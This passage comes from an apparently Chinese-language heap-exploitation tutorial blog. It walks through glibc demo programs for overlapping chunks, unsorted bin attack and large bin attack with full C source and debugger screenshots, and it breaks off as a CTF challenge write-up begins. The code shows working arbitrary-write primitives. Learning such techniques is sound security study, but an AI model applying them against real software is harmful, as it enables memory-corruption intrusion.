<span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n那么之后再 memset(p3, &#x27;3&#x27;, 80), 将会:\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p4+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-keyword">char</span> *)p3+<span class="hljs-number">0x10</span>);<br>&#125;     <br></code></pre></td></tr></table></figure><p>   这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写unsorted bin 中空闲堆块的size，改变下一次malloc可以返回的堆块大小。</p><p>​    直接动手调试，首先申请三个堆块。</p><p> <img src="https://s2.loli.net/2021/12/26/TvWyefJ19bFz7La.png"></p><p>​    接着free掉p2，这时候p2被放到unsorted bin中。 </p><p> <img src="https://s2.loli.net/2021/12/26/cOJpNVPItwQTREK.png"></p><p>​    然后把p2的size改成0x180，这时候就把p3给包含进去了。</p><p> <img src="https://s2.loli.net/2021/12/26/eTDvralqCkFRJ5V.png"></p><p>​    然后再去申请一块大小为0x180的堆块p4，就能够编辑p4，就可以修改p3的内容，编辑p3也可以修改p4的内容。</p><p> <img src="https://s2.loli.net/2021/12/26/PbgcKN1Rm2wMW7n.png"></p><h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h2><p>   同样是堆块重叠的问题，前面那个是在chunk已经被free，加入到了unsorted bin之后，再修改其size值，然后malloc一个不一样的chunk出来，而这里是在 free之前修改size值，使free错误地修改了下一个chunk的prev_size值，导致中间的chunk强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。</p><p>   源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>  <br>  <span class="hljs-keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;<br>  <span class="hljs-keyword">int</span> prev_in_use = <span class="hljs-number">0x1</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n一开始分配 5 个 chunk&quot;</span>);<br>  p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  real_size_p1 = malloc_usable_size(p1);<br>  real_size_p2 = malloc_usable_size(p2);<br>  real_size_p3 = malloc_usable_size(p3);<br>  real_size_p4 = malloc_usable_size(p4);<br>  real_size_p5 = malloc_usable_size(p5);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p1 从 %p 到 %p&quot;</span>, p1, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p1+malloc_usable_size(p1));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p2 从 %p 到 %p&quot;</span>, p2,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p2+malloc_usable_size(p2));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p&quot;</span>, p3,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p3+malloc_usable_size(p3));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p4 从 %p 到 %p&quot;</span>, p4, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p4+malloc_usable_size(p4));<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p5 从 %p 到 %p\n&quot;</span>, p5,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p5+malloc_usable_size(p5));<br><br>  <span class="hljs-built_in">memset</span>(p1,<span class="hljs-string">&#x27;A&#x27;</span>,real_size_p1);<br>  <span class="hljs-built_in">memset</span>(p2,<span class="hljs-string">&#x27;B&#x27;</span>,real_size_p2);<br>  <span class="hljs-built_in">memset</span>(p3,<span class="hljs-string">&#x27;C&#x27;</span>,real_size_p3);<br>  <span class="hljs-built_in">memset</span>(p4,<span class="hljs-string">&#x27;D&#x27;</span>,real_size_p4);<br>  <span class="hljs-built_in">memset</span>(p5,<span class="hljs-string">&#x27;E&#x27;</span>,real_size_p5);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p4);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n&quot;</span>);<br>  *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">2</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n这样的话将会 free 掉的 p2 将会包含 p3\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br>  <br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n&quot;</span>);<br>  p6 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2000</span>);<br>  real_size_p6 = malloc_usable_size(p6);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p6 从 %p 到 %p&quot;</span>, p6,  (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)p6+real_size_p6);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nchunk p3 从 %p 到 %p\n&quot;</span>, p3, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *) p3+real_size_p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-keyword">char</span> *)p3);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n往 p6 中写入\&quot;F\&quot;\n&quot;</span>);<br>  <span class="hljs-built_in">memset</span>(p6,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-number">1500</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np3 中的内容: \n\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s\n&quot;</span>,(<span class="hljs-keyword">char</span> *)p3);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    我们需要五个堆块，假设第chunk 1存在溢出，可以改写第二个chunk 2的数据，chunk 5的作用是防止释放chunk 4后,被合并进top chunk。所以我们要重叠的区域是chunk 2到chunk 4。</p><p>   首先申请5个chunk，分别是p1，p2，p3，p4，p5。</p><p> <img src="https://s2.loli.net/2021/12/26/QKSJm9X8iYlOyfZ.png"></p><p>   然后free掉p4，p4被放入unsorted bin。</p><p> <img src="https://s2.loli.net/2021/12/26/x6e9ujCEaIkrSJR.png"></p><p>接下来是最关键的一步，利用chunk 1的溢出漏洞，将chunk 2的size值修改为chunk 2和chunk 3的大小之和，即0x3f0+0x3f0+0x1=0x7e1，最后的1是标志位。</p><p> <img src="https://s2.loli.net/2021/12/26/amQFXLNWRftEqbp.png"></p><p>这样当我们释放chunk 2的时候，malloc根据这个被修改的size值，会以为chunk 2加上 chunk 3的区域都是要释放的，然后就错误地修改了chunk 5的 prev_size。接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。</p><p> <img src="https://s2.loli.net/2021/12/26/AY5ETmLWcVjosv9.png"></p><p>   再次去malloc 0x7e0大小的chunk p6会把包含p3的p2给申请到，这样再去编辑p6的时候也可以编辑到p3。</p><p> <img src="https://s2.loli.net/2021/12/26/mTQBqEvzVJIyWo7.png"></p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>​    unsorted bin攻击通常是为更进一步的攻击做准备的，我们知道unsorted bin是一个双向链表，在分配时会通过unlink操作将chunk从链表中移除，所以如果能够控制unsorted bin chunk的bk指针，就可以向任意位置写入一个指针。</p><p>  源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;一开始先申请一个比较正常的 chunk: %p\n&quot;</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个避免与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-keyword">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    编译完成之后分别在10、13、16、19行下断点。</p><p>​    然后运行，一开始先申请两个chunk，第二个是为了防止和top chunk合并。</p><p> <img src="https://s2.loli.net/2021/12/26/AslPx52ywJGFWMf.png"></p><p>​    当free之后，这个chunk的fd、bk都指向了unsorted bin的位置，因为unsorted bin是双向链表。</p><p> <img src="https://s2.loli.net/2021/12/26/nWIehUSBNYQKbVr.png"></p><p>   继续，通过p[1] = (unsigned long)(&amp;stack_var - 2)，把bk指针给改掉了。unsigned long是8字节大小的，所以减去2之后正好是在address 这个地方。</p><p> <img src="https://s2.loli.net/2021/12/26/ezX5kUS1lRtJgVB.png"></p><p>​    然后再去申请的时候需要把释放的那一块给拿出来，操作如下：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><span class="hljs-comment">//bck = chunk-&gt;bkunsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);</span><br></code></pre></td></tr></table></figure><p>  把unsorted bin的bk改为chunk的bk，然后将chunk的bk所指向的 fd改为unsorted bin的地址。</p><p> <img src="https://s2.loli.net/2021/12/26/INPjVX1byFdmBAg.png">    </p><p> <img src="https://s2.loli.net/2021/12/26/RGsX3Ul2ywgC9p8.png"></p><p>   因为对于一个chunk来说，chunk头是占据0x10大小的（也就是图中 address），所以fd正好是我们想要改的那个地址。</p><p> <img src="https://s2.loli.net/2021/12/26/DJbhTS1ERQCc2VF.png"></p><p> <img src="https://s2.loli.net/2021/12/26/HPVgs8etxRNj7bo.png"></p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>​    回顾一下large bin的概念，large bin大小：大于1024字节</p><p>   双向循环链表，先进先出，按照从大到小排序</p><p>   当有空闲块相邻的时候，chunk会被合并</p><p>   除了fd、bk指针还有fd_nextsize和bk_nextsize</p><p>​    源码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先来看一下目标:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;分配第一个 large chunk: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第二个 large chunk 在: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后申请第三个 large chunk 在: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第三个，他会被放到 unsorted bin 中: [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设有个漏洞，可以覆盖掉第二个 chunk 的 \&quot;size\&quot; 以及 \&quot;bk\&quot;、\&quot;bk_nextsize\&quot; 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-keyword">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-keyword">void</span> *)stack_var2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    该技术可用于修改任意地址的值，例如栈上的变量stack_var1和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在fastbin attack 中用于修改全局变量global_max_fast为一个很大的值。</p><p>​    首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。</p><p> <img src="https://s2.loli.net/2021/12/26/EPrmF1XuZSLHvw3.png"></p><p>​    接下来释放p1和p2，它们被放入unsorted bin中。</p><p>  <img src="https://s2.loli.net/2021/12/26/k1BqnwV7jJ9hEe6.png"></p><p>​    接下来去申请一个0x90大小的堆块，他会把前面那个0x320大小的堆块切割，同时会给unsorted bin中的free chunk进行整理划分，把那第二块大的放到large bin，第一个剩余的放回到unsorted bin中。</p><p> <img src="https://s2.loli.net/2021/12/26/FLhHWCkbZzlNr7i.png"></p><p>​    接着free掉p3，将其放入unsorted bin，我们伪造的分别是p2的size、bk以及bk_nextsize，紧接着进行malloc操作，将p3整合进large bin。</p><p>  <img src="https://s2.loli.net/2021/12/26/6mf2nzNps5M79lZ.png"></p><p>​    Large bin是按照fd指针的顺序从大到小排列的，所以需要进行排序，排序的操作大概是：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//victim是p3、fwd是修改后的p2</span><br>&#123;<br>    victim-&gt;fd_nextsize = fwd;<span class="hljs-comment">//1</span><br>    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="hljs-comment">//2</span><br>    fwd-&gt;bk_nextsize = victim;<span class="hljs-comment">//3</span><br>    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//4</span><br>&#125;<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>​    把2带入4得到：fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim，同时下面有：fwd-&gt;bk=victim。也就是说之前我们伪造的p2的bk跟bk_nextsize指向的地址被改为了victim，即(unsigned long)(&amp;stack_var1 - 2)与(unsigned long)(&amp;stack_var2 - 4)被改为了victim。</p><p> <img src="https://s2.loli.net/2021/12/26/Usu5Bhy3J1IkLlP.png"></p><h2 id="西湖论剑Storm-note"><a href="#西湖论剑Storm-note" class="headerlink" title="西湖论剑Storm_note"></a>西湖论剑<a href="https://bbs.pediy.com/thread-254849.htm">Storm_note</a></h2><p>赛题下载后，checksec查看程序的保护机制 </p><p><img src="https://s2.loli.net/2021/12/26/UICXhL4nvl8bEVy.png"></p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="init-proc函数"><a href="#init-proc函数" class="headerlink" title="init_proc函数"></a>init_proc函数</h4><p>​    程序一开始就对进程进行初始化，<code>mallopt(1, 